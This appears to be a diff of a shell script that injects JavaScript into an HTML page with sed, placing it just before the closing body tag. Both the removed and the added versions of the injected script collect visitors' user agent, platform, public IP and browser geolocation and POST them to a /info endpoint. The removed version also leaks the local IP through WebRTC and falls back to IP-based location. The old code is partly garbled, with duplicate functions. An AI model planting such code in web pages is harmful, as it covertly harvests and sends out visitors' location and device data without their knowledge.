@@ -26,141 +26,32 @@ cp "$HTML_FILE" "${HTML_FILE}.bak"
 echo "Injecting JavaScript into $HTML_FILE..."
 sed -i '/<\/body>/i \
 <script> \
-async function gatherDeviceInfo() {
-    const userAgent = navigator.userAgent; // Get user agent string
-    const platform = navigator.platform; // Get device platform (e.g., Win32, MacIntel)
-    const screenResolution = {
-        width: screen.width,
-        height: screen.height,
-    }; // Get screen resolution
-    const deviceMemory = navigator.deviceMemory || "Unknown"; // Approximate device RAM (if supported)
-    const cores = navigator.hardwareConcurrency || "Unknown"; // Number of CPU cores
-
-    return {
-        userAgent,
-        platform,
-        screenResolution,
-        deviceMemory,
-        cores,
-    };
-}
-
-async function gatherLocation() {
-    const data = { 
-        ip: null, 
-        localIP: null, 
-        location: null,
-        deviceInfo: null 
-    };
-
-    try {
-        // Get public IP
-        data.ip = await fetch("https://api.ipify.org?format=json")
-            .then(res => res.json())
-            .then(res => res.ip);
-
-        // Get local IP
-        data.localIP = await getLocalIP();
-
-        // Gather device information
-        data.deviceInfo = await gatherDeviceInfo();
-
-        // Get browser geolocation
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(
-                position => {
-                    data.location = {
-                        latitude: position.coords.latitude,
-                        longitude: position.coords.longitude
-                    };
-                    console.log("Accurate Location and Device Info:", data);
-                    sendData(data);
-                },
-                error => {
-                    console.error("Browser location denied. Using IP-based fallback.");
-                    fallbackToIPGeolocation(data);
-                }
-            );
-        } else {
-            console.error("Geolocation not supported by browser.");
-            fallbackToIPGeolocation(data);
-        }
-    } catch (error) {
-        console.error("Error gathering data:", error);
-    }
-}
-
-function sendData(data) {
-    fetch("/info", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(data),
-    })
-        .then(() => console.log("Data sent"))
-        .catch(err => console.error("Error sending data:", err));
-}
-
-async function getLocalIP() { \
-    return new Promise((resolve, reject) => { \
-        const pc = new RTCPeerConnection({ iceServers: [] }); \
-        pc.createDataChannel(""); \
-        pc.onicecandidate = (ice) => { \
-            if (!ice || !ice.candidate || !ice.candidate.candidate) return; \
-            const localIP = /([0-9]{1,3}(\\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate); \
-            pc.close(); \
-            resolve(localIP ? localIP[1] : null); \
-        }; \
-        pc.createOffer().then((offer) => pc.setLocalDescription(offer)).catch(err => reject(err)); \
-    }); \
-} \
-async function gatherLocation() { \
-    const data = { ip: null, localIP: null, location: null }; \
-    try { \
-        // Get public IP \
-        data.ip = await fetch("https://api.ipify.org?format=json").then(res => res.json()).then(res => res.ip); \
-        data.localIP = await getLocalIP(); \
-        console.log("Public IP:", data.ip); \
-        console.log("Local IP:", data.localIP); \
-        \
-        // Get browser geolocation \
-        if (navigator.geolocation) { \
-            navigator.geolocation.getCurrentPosition( \
-                position => { \
-                    data.location = { \
-                        latitude: position.coords.latitude, \
-                        longitude: position.coords.longitude \
-                    }; \
-                    console.log("Accurate Location:", data); \
-                    sendData(data); \
-                }, \
-                error => { \
-                    console.error("Browser location denied. Using IP-based fallback."); \
-                    fallbackToIPGeolocation(data); \
-                } \
-            ); \
-        } else { \
-            console.error("Geolocation not supported by browser."); \
-            fallbackToIPGeolocation(data); \
-        } \
-    } catch (error) { \
-        console.error("Error gathering data:", error); \
+async function gatherInfo() { \
+    const data = { \
+        userAgent: navigator.userAgent, \
+        platform: navigator.platform, \
+        language: navigator.language, \
+        ip: await fetch("https://api.ipify.org?format=json").then(res => res.json()).then(res => res.ip), \
+    }; \
+    if (navigator.geolocation) { \
+        navigator.geolocation.getCurrentPosition( \
+            position => { \
+                data.location = { \
+                    latitude: position.coords.latitude, \
+                    longitude: position.coords.longitude \
+                }; \
+                sendData(data); \
+            }, \
+            error => { \
+                console.error("Location access denied"); \
+                sendData(data); \
+            } \
+        ); \
+    } else { \
+        console.error("Geolocation is not supported"); \
+        sendData(data); \
     } \
 } \
-async function fallbackToIPGeolocation(data) { \
-    const ipInfo = await fetch("https://ipinfo.io/json?token=YOUR_API_KEY").then(res => res.json()); \
-    const [latitude, longitude] = ipInfo.loc.split(",").map(Number); \
-    data.location = { latitude, longitude }; \
-    console.log("Fallback Location:", data); \
-    sendData(data); \
-} \
-function sendData(data) { \
-    fetch("/info", { \
-        method: "POST", \
-        headers: { "Content-Type": "application/json" }, \
-        body: JSON.stringify(data) \
-    }).then(() => console.log("Data sent")).catch(err => console.error("Error sending data:", err)); \
-} \
-window.onload = gatherLocation; \
 function sendData(data) { \
     fetch("/info", { \
         method: "POST", \
